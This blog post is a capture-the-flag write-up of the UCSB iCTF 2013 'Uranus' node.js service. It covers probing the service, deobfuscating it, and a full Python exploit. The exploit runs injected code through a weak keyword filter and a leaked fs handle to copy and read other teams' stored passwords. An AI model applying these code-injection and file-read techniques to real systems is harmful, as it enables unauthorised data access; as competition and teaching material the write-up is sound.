---
layout: post
title: "UCSB iCTF 2013 - The Uranus service"
date: 2013-12-13 19:43
comments: true
categories: 
---

The uranus service of the [UCSB iCTF](http://ictf.cs.ucsb.edu/) competition this year was an [obfuscated node.js module](/files/uranus.js).

<!-- more -->

Initial exploration
-------------------

It was very easy to get it running locally (it had no external dependencies besides node.js itself) and explore the basic functionality:

```bash
$ curl localhost:1337
Welcome to Uranus!
With the last update of our nuclear reactor we can now control critical variables of the process
through the easyness of JavaScript. Uranus is here to proof-check your code for safety before
you submit it directly to the reactor. 

Use HTTP POST to submit your code.

$ curl -d 'abcd' localhost:1337
Your JSON is malformed. Please provide the following properties: flag_id, token, code

$ curl -d '{"flag_id": 1, "token": 2, "code": "console.log(1234)"}' localhost:1337
Your code is missing an access code to the nuclear reactor. Expected variable according to the
documentation is "password".
```

When submitting this, the the '1234' string appeared on the server's stdout so it was obviously executing the submitted code. The error message says that a variable named password must be set:

```bash
$ curl -d '{"flag_id": 1, "token":2, "code": "var password = 5"}' localhost:1337
Your code is missing an access code to the nuclear reactor. Expected variable according to the
documentation is "password".

$ curl -d '{"flag_id": 1, "token":2, "code": "var password = \"a\""}' localhost:1337
Code approved. Please check your parameters carefully before deploying the code to the nuclear
reactor.
```

At this point, the service has created a file in the `submissions` directory named `1-2` containing the submitted code.

Since it was before the level 4 (the last few hours of the CTF) when we started working on this, we did not see any legitim traffic yet. Based on these experiments, it was clear that the legitim traffic should consist of code uploads. The exploit code gets the flag_id as a parameter. This identifies a certain uploaded code (except that we don't know the token). The flag must be the password that was used when uploading the file.

Let's try to read a file with the submitted code:

```
$ curl -d '{"flag_id": 2, "token": 3, "code": "console.log(require(\"fs\").readFileSync(\"submissions/1-2\"))"}' localhost:1337
Your code has runtime errors: ReferenceError: require is not defined
```

`require` is the function used to import modules in node.js and it was not available so it was not possible to import the filesystem module needed to manipulate files... After a few more trial, I decided to look at the source code to find a way to read files and send the content back to the exploit.

Deobfuscation
-------------

The source code looked terribly obfuscated, but fortunately, the obfuscation *seemed* to be easy to revert. The obfuscated code worked like this:

1. Fill an array with seemingly random bytes
2. Do some magic
3. `eval()` the resulting string

Replacing the `eval()` with `console.log()` showed the deobfuscated source code. After prettifying the resulting code:

```javascript
var r3A8 = (function () {
  var U8 = (function (Z8, S8) {
    var D8 = "", C8 = 'return ', e8 = ((0x1B2, 95.) < (45, 92.60E1) ? (7.07E2, false) : (110., 6.2E1) > 0x179 ? 1 : (129, 9.4E2));
    if (Z8.length > ((0x1EF, 21.) < (1.18E3, 14) ? (0x139, 1) : 32. > (23, 0xB9) ? (1.97E2, "R") : (6.350E2, 97.) <= 0x1F9 ? (39., 12) : (31.3E1, 0x1B5)))for (var r8 = ((117., 140.) <= (0x18A, 138.) ? (0xA9, "z") : (17., 1.71E2) <= (0x212, 58.) ? (147.8E1, 130) : 0x106 < (33., 0x226) ? (26., 13) : (0x1D2, 0xFB)); r8 > ((54.30E1, 0xF1) >= (1.5E1, 7.390E2) ? (0, 38.1E1) : (0x1F9, 0x133) > 79.10E1 ? (68, '\n') : (133.1E1, 81) < 0x173 ? (22., 1) : (1.241E3, 0x41));)D8 += (e8 = (e8 ? ((76, 0x167) < (6.2E2, 12.93E2) ? (18.0E1, false) : (0x127, 90.80E1) <= 1.16E2 ? (7.96E2, 0x69) : (10.93E2, 22.8E1)) : ((0x1F8, 0x1FE) > (30.1E1, 124.) ? (31., true) : (37.80E1, 110.7E1)))) ? Z8.charAt(r8) : "@%)eitg)(tDwn".charAt(r8--);
    return S8 === ((49.5E1, 0x8B) > (61, 0x20D) ? (56.6E1, "l") : (147, 106) <= (0x15, 131.) ? (56, null) : (109., 95.2E1)) ? [(145.5E1 > (4.11E2, 0x1C5) ? (0x244, null) : 14.67E2 <= (100, 119.) ? (75.4E1, false) : (0x16D, 106.) < 12. ? 0x222 : (8.64E2, 0xF5))].constructor.constructor(C8 + D8)() : S8 ^ Z8
  })("_9(mTe.)ea e(", ((0x127, 0x216) > (130.6E1, 0x25) ? (2.36E2, null) : (62., 142) < (0x251, 72) ? (128.0E1, 'R') : (0x19, 90.30E1) < 21. ? (127, 9.5E2) : (0x4D, 9.540E2)));
  return {J8: function (H8) {
    var g8, R8 = ((1.414E3, 117) >= 70. ? (12.0E1, 0) : (73.5E1, 147.70E1) <= 2.5E1 ? (1.3980E3, true) : (53, 98.2E1)), W8 = ((44.6E1, 130.20E1) > 0x133 ? (24.6E1, 0x142CF49F580) : (12.9E1, 10.) >= 133. ? (107., 0x193) : (0x240, 0x4E)) > U8, G8;
    for (; R8 < H8.length; R8++) {
      G8 = (parseInt(H8.charAt(R8), 16)).toString((14. > (0x9D, 0x21D) ? (0x155, 0xCD) : (42.40E1, 141.) <= 76. ? (3.25E2, 42) : 132. < (0x62, 11.99E2) ? (94.10E1, 2) : (0x8B, 34)));
      g8 = R8 == 0 ? G8.charAt(G8.length - 1) : g8 ^ G8.charAt(G8.length - 1)
    }
    return g8 ? W8 : !W8
  }};
})();
var z9o2 = r3A8.J8("63") ? {'p2': "length", 'n2': "fs", 'w4': "toString", 'J4': "-", 'v2': "listen", 'R4': "log", 'a4': 'uncaughtException', 'd2': '0.0.0.0', 'c4': 'Server running at http://0.0.0.0:1337/', 'Q4': "http", 'N4': 'text/plain', 'W4': "createServer", 'Q2': {}, 'M4': 1337, 't2': "on", 's4': "submissions", 'x2': "/", 'y2': 1, 'X2': 200, 'f2': "end", 'l2': "", 'A4': "writeHead"} : 1337;
function handle(E, b) {
  var k = r3A8.J8("aa2e") ? 'You suck\n' : 'Welcome to Uranus!\nWith the last update of our nuclear reactor we can now control critical variables of the process through the easyness of JavaScript. Uranus is here to proof-check your code for safety before you submit it directly to the reactor. \n\nUse HTTP POST to submit your code.', V = r3A8.J8("f56") ? "test" : "POST", s = r3A8.J8("a6cf") ? "indexOf" : "l", c = r3A8.J8("5613") ? "method" : "writeFileSync";
  if (E[c][s](V) != -z9o2.y2) {
    handlePOST(E, b);
    return;
  } else {
    b[z9o2.A4](z9o2.X2, {'Content-Type': z9o2.N4});
    b[z9o2.f2](k);
  }
}
function makeSandbox() {
  delete  eval;
  delete  Function;
  delete  require;
  delete  fs;
}
function loadSubmission(b, k) {
  var V = r3A8.J8("81") ? "No password found" : "token", s = r3A8.J8("c14") ? "match" : "toString", c = r3A8.J8("5f") ? "eval" : "readFileSync", w = r3A8.J8("ffb7") ? 'Server running at http://0.0.0.0:1337/' : z9o2.s4, z = r3A8.J8("fb") ? 'Your code has runtime errors: ' : b + z9o2.J4 + k;
  try {
    var O = r3A8.J8("67cf") ? "Code contains unsafe functionality.\n" : ff[c](w + z9o2.x2 + z)[z9o2.w4]();
    return O[s](/password = "([0-9a-zA-Z]{16})"/)[z9o2.y2];
  } catch (E) {
    ;
  }
  return V;
}
function test(b) {
  var k = r3A8.J8("1b") ? "k" : "runInThisContext", V = r3A8.J8("81e") ? "vm" : "handlePOST", s = r3A8.J8("74") ? function (E) {
    global = r3A8.J8("a11a") ? "g" : E;
  } : false, c = r3A8.J8("33c1") ? function (E) {
    password = r3A8.J8("77") ? "loadSubmission" : E;
  } : "submissions", w = r3A8.J8("d5") ? "retval" : require(V);
  c(z9o2.l2);
  s(z9o2.l2);
  w[k](b[z9o2.w4]());
  return password;
}
function storeSubmission(b, k, V) {
  var s = r3A8.J8("ac") ? "handle" : "writeFileSync", c = r3A8.J8("3a8") ? "mkdirSync" : "http", w = r3A8.J8("6ef") ? "statSync" : "err", z = z9o2.s4, O = b + z9o2.J4 + k;
  try {
    var Z = ff[w](z);
  } catch (E) {
    ;
  }
  if (!Z)ff[c](z);
  ff[s](z + z9o2.x2 + O, V);
}
function checkCode(E) {
  var b = r3A8.J8("61") ? true : "res", k = r3A8.J8("2f7") ? "test" : false, V = "test", s = r3A8.J8("3ae") ? ((30, 0xC4) < (96.5E1, 9) ? 'R' : (105.2E1, 44.) >= (142, 1.183E3) ? (110, 133.70E1) : 120. > (53.6E1, 96) ? (0x24A, "q") : (8.4E1, 1.5E1)) : "writeFileSync", c = r3A8.J8("ba") ? ((9.99E2, 119.80E1) <= (24., 10.96E2) ? '\n' : 131 >= (0x105, 0x132) ? '\n' : (1.0010E3, 72) <= 23.90E1 ? (124., 0) : (100., 0x254)) : "data", w = [/eval/, /global/, /Function/, /this/];
  for (var z = c; A3a[s](z, w[z9o2.p2]); z++) {
    if (w[z][V](E)) {
      return k;
    }
  }
  return b;
}
function handlePOST(G, A) {
  var N = r3A8.J8("e1c") ? "data" : "hasOwnProperty";
  G[z9o2.t2](N, function (k) {
    var V = 'Your JSON is malformed. Please provide the following properties: flag_id, token, code\n', s = 'Code contains unsafe functionality.\n', c = r3A8.J8("46cf") ? 'Your code is missing an access code to the nuclear reactor. Expected variable according to the documentation is "password".\n' : "Received: %s", w = r3A8.J8("53") ? 'text/plain' : 'Code approved. Please check your parameters carefully before deploying the code to the nuclear reactor.\n', z = r3A8.J8("555") ? "U" : "i", O = r3A8.J8("8ccd") ? '\n' : true, Z = 'Your password: ', e = "code", T = "token", D = r3A8.J8("2235") ? "e" : "flag_id", J = r3A8.J8("8f") ? "hasOwnProperty" : "hasOwnProperty", R = r3A8.J8("2fb") ? "patterns" : "parse";
    try {
      data_json = JSON[R](k);
    } catch (E) {
      var b = function () {
        data_json = r3A8.J8("265") ? {} : ((0x17B, 149.) >= (30., 0x20F) ? (12.17E2, "vm") : (7.79E2, 128) <= 0x1A6 ? (21.90E1, 200) : (57., 53.) > 106.7E1 ? (7.26E2, 84.) : (11.61E2, 1.5E2));
      };
      b();
    }
    if (data_json[J](D) && data_json[J](T)) {
      if (!data_json[J](e)) {
        old_password = loadSubmission(data_json[D], data_json[T]);
        A[z9o2.A4](z9o2.X2, {'Content-Type': z9o2.N4});
        A[z9o2.f2](Z + old_password + O);
      } else {
        var W = r3A8.J8("d6b7") ? function (E) {
          code = E[e];
        } : "No password found", B = function (E) {
          password = r3A8.J8("5c78") ? "retval" : E;
        };
        B(z9o2.l2);
        W(data_json);
        if (checkCode(code)) {
          try {
            retval = r3A8.J8("c4") ? "Server running at http://0.0.0.0:1337/" : test(code[z9o2.w4]());
          } catch (E) {
            var b = r3A8.J8("b38a") ? "Your password: " : 'Your code has runtime errors: ';
            A[z9o2.A4](z9o2.X2, {'Content-Type': z9o2.N4});
            A[z9o2.f2](b + E + O);
          }
          try {
            if (A3a[z](password[z9o2.p2], z9o2.y2)) {
              storeSubmission(data_json[D], data_json[T], code);
              A[z9o2.A4](z9o2.X2, {'Content-Type': z9o2.N4});
              A[z9o2.f2](w);
            }
          } catch (E) {
            console[z9o2.R4](E);
          }
          A[z9o2.A4](z9o2.X2, {'Content-Type': z9o2.N4});
          A[z9o2.f2](c);
        }
      }
      A[z9o2.A4](z9o2.X2, {'Content-Type': z9o2.N4});
      A[z9o2.f2](s);
    } else {
      A[z9o2.A4](z9o2.X2, {'Content-Type': z9o2.N4});
      A[z9o2.f2](V);
    }
  });
}
var A3a = {'U': function (E, b) {
  return E >= b;
}, 'q': function (E, b) {
  return E < b;
}, 'M': {}};
http = r3A8.J8("c534") ? "submissions" : require(z9o2.Q4);
ff = r3A8.J8("6422") ? 200 : require(z9o2.n2);
process[z9o2.t2](z9o2.a4, function (E) {
  var b = 'Caught exception: ';
  console[z9o2.R4](b + E);
});
http[z9o2.W4](handle)[z9o2.v2](z9o2.M4, z9o2.d2);
console[z9o2.R4](z9o2.c4)
```

Looks much better right? Well, not really.

First, the `z9o2` object contains primitive values and it is referenced everywhere instead of using strings and numbers directly. Code like `A[z9o2.A4](z9o2.X2, {'Content-Type': z9o2.N4});` should be translated to `A.writeHead(200, {'Content-Type': 'text/plain'})` (`x['y']` is equivalent to `x.y` in JavaScript). I wrote a little node.js script to inline these:

```javascript
var z9o2 = {'p2': "length", 'n2': "fs", 'w4': "toString", 'J4': "-", 'v2': "listen", 'R4': "log",
            'a4': 'uncaughtException', 'd2': '0.0.0.0',
            'c4': 'Server running at http://0.0.0.0:1337/', 'Q4': "http", 'N4': 'text/plain',
            'W4': "createServer", 'Q2': {}, 'M4': 1337, 't2': "on", 's4': "submissions", 'x2': "/",
            'y2': 1, 'X2': 200, 'f2': "end", 'l2': "", 'A4': "writeHead"};
source = require('fs').readFileSync(process.argv[2]).toString()
for (key in z9o2) {
    if (typeof(z9o2[key]) == 'number') {
        source = source.replace(RegExp('z9o2.' + key, 'g'), z9o2[key])
    } else {
        source = source.replace(RegExp('\\[z9o2.' + key + ']', 'g'), "." + z9o2[key])
        source = source.replace(RegExp('z9o2.' + key, 'g'), "'" + z9o2[key] + "'")
    }
}
console.log(source)
```

Then, there are lot of conditional expressions that use the `r3A8.J8()` function like this: `r3A8.J8("1b") ? "k" : "runInThisContext"`. It seems to be some kind of hash function with a boolean output, since it's a pure function without side effects. (**Update**: it turned out to be this simple only for the duration of the competition since it checks the date :) For a deeper analysis of this function, see [this writeup](http://wizardsofdos.de/blog/?p=1254096)) I wrote another small script to resolve these:

```javascript
var source = require('fs').readFileSync(process.argv[2]).toString();
var ast = require('esprima').parse(source);

var r3A8 = (function () { /* ... copied from the source file */ })();

traverse(ast);

function traverse(ast) {
  try {
    // Match only expressions like r3A8.J8(a) ? b : c
    if (ast.test.callee.object.name == "r3A8" && ast.test.callee.property.name == 'J8') {
      // Resolving the conditional expression
      var decision = r3A8.J8(ast.test.arguments[0].value);
      var value = decision ? ast.consequent : ast.alternate;
      for (var key in ast) delete ast[key];
      for (key in value) ast[key] = value[key];
      return;
    }
  } catch (e) {}

  if (ast instanceof Object) {
    for (var key in ast) traverse(ast[key]);
  }
}

var source = require('escodegen').generate(ast);

console.log(source)
```

There were a few more tricks that were only present in a few lines; those were resolved by hand. After inlining most of the variables in the resulting code (modern IDEs usually provide a shortcut to easily do that), it looks like a normal node.js program now.

The deobfuscated code
---------------------

```javascript
http = require('http');
ff = require('fs');

function loadSubmission(flag_id, token) {
    try {
        var O = ff.readFileSync('submissions/' + flag_id + '-' + token).toString();
        console.log('dfsd ', O, O.match(/password = "([0-9a-zA-Z]{16})"/));
        return O.match(/password = "([0-9a-zA-Z]{16})"/)[1];
    } catch (E) {}
    return 'No password found';
}
function storeSubmission(flag_id, token, code) {
    try {
        var Z = ff.statSync('submissions');
    } catch (E) {}
    if (!Z) ff.mkdirSync('submissions');
    ff.writeFileSync('submissions/' + flag_id + '-' + token, code);
}


function test(code) {
    password = '';
    global = '';
    require('vm').runInThisContext(code.toString());
}
function checkCode(code) {
    var checks = [
            /eval/,
            /global/,
            /Function/,
            /this/
        ];
    for (var z = 0; z < checks.length; z++) {
        if (checks[z].test(code)) {
            return false;
        }
    }
    return true;
}

function handlePOST(req, res) {
    req.on('data', function (k) {
        console.log(k.toString());
        try {
            data_json = JSON.parse(k);
        } catch (E) {
            data_json = {};
        }
        if (data_json.hasOwnProperty('flag_id') && data_json.hasOwnProperty('token')) {
            if (!data_json.hasOwnProperty('code')) {
                old_password = loadSubmission(data_json.flag_id, data_json.token);
                res.writeHead(200, { 'Content-Type': 'text/plain' });
                res.end('Your password: ' + old_password + '\n');
            } else {
                password = '';
                code = data_json['code'];
                if (checkCode(code)) {
                    try {
                        test(code.toString());
                    } catch (E) {
                        res.writeHead(200, { 'Content-Type': 'text/plain' });
                        res.end('Your code has runtime errors: ' + E + '\n');
                    }
                    try {
                        if (password.length >= 1) {
                            storeSubmission(data_json['flag_id'], data_json['token'], code);
                            res.writeHead(200, { 'Content-Type': 'text/plain' });
                            res.end('Code approved. Please check your parameters carefully before deploying the code to the nuclear reactor.\n');
                        }
                    } catch (E) {
                        console.log(E);
                    }
                    res.writeHead(200, { 'Content-Type': 'text/plain' });
                    res.end('Your code is missing an access code to the nuclear reactor. Expected variable according to the documentation is "password".\n');
                }
            }
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end('Code contains unsafe functionality.\n');
        } else {
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end('Your JSON is malformed. Please provide the following properties: flag_id, token, code\n');
        }
    });
}

process.on('uncaughtException', function (E) {
    console.log('Caught exception: ' + E);
});

http.createServer(function handle(req, res) {
    if (req.method.indexOf('POST') != -1) {
        handlePOST(req, res);
    } else {
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end('Welcome to Uranus!\nWith the last update of our nuclear reactor we can now control critical variables of the process through the easyness of JavaScript. Uranus is here to proof-check your code for safety before you submit it directly to the reactor. \n\nUse HTTP POST to submit your code.');
    }
}).listen(1337, '0.0.0.0');

console.log('Server running at http://0.0.0.0:1337/');
```

The full functionality:

- If `flag_id`, `token` and `code` is specified as JSON
  - the code is run if it passes the filter (`eval`, `global`, `Function` and `this` is not alowed)
  - the code can't use `require` because [it's not exposed by default](https://groups.google.com/forum/#!topic/nodejs/vFkaH8gouDU) when using the `vm` module
  - if it sets the variable `password` then the code is stored in this file: `submissions/{flag_id}-{token}`
- If only `flag_id` and `token` is specified
  - the password from the `submissions/{flag_id}-{token}` file is read and returned
  - but only if the password is 16 alphanumerical character

Exploitation
------------

Our exploit worked like this:

1. Upload a code,
2. that finds the file associated with the flag_id
3. and copies the file to a known location.
4. Use the password retrieval functionality to retrieve the password from the known location.

Here's the full exploit code:

```python
import urllib2
import json
import re


class Exploit():
    code = """
    fname = ff.readdirSync('./submissions').filter(function(name) { return name.match(/^%s-.*/) })[0];
    ff.writeFileSync('./submissions/spamandhex-1', ff.readFileSync('./submissions/' + fname));
    """

    def get(self, url, flag_id, token):
        data = json.dumps({ "flag_id": flag_id, "token": token })
        return urllib2.urlopen(url=url, data=data).read()

    def set(self, url, flag_id, token, code):
        data = json.dumps({ "flag_id": flag_id, "token": token, "code": code })
        return urllib2.urlopen(url=url, data=data).read()

    def execute(self, ip, port, flag_id):
        url = 'http://%s:%s' % (ip, port)
        self.set(url, '1234', '1', Exploit.code % flag_id)
        result = self.get(url, 'spamandhex', '1')
        self.flag = re.findall('Your password: (.*)', result)[0]

    def result(self):
        return {'FLAG' : self.flag}
```

Instead of using `require` to access the `fs` module, the global `ff` variable (set by the server code) was used that holds a reference to the `fs` module. The filter does not find the `function` keyword because the filter was `/Function/` and regexes are case-sensitive by default.

After launching our own, we also saw an exploit that abuses the fact that exceptions were reported back to the submitter. This exploit did read out the password from the appropriate file and generated an exception with the password as text.

Patch
-----

As a patch, I renamed the `ff` variable to `fs`, and it turned out to be enough to keep the other teams away.

Thanks
------

It was great fun to solve this puzzle, just as fun as the whole UCSB iCTF competition this year. Thanks to the organizers for organizing such a great competition again this year!

